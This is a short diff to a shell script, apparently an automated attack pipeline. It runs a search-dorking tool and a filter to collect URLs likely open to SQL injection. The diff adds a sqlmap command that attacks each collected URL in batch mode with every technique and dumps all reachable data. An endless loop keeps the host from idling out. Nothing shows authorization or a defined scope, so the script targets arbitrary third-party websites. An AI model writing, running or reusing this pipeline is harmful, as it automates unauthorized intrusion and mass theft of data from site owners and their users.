@@ -25,6 +25,11 @@ python dorkx.py
 echo "Running Filtering URL for Injection SQL..."
 python filter.py
 
+# Run sqlmap with the filtered URLs
+echo "Running sqlmap with filtered URLs..."
+sqlmap -m sqlurl.txt --batch --random-agent --level=2 --risk=1 --technique=BEUSTQ --all -o finalsql
+
+
 # Keep script running to prevent idle timeout
 while true; do
     echo "Preventing idle timeout... $(date)"
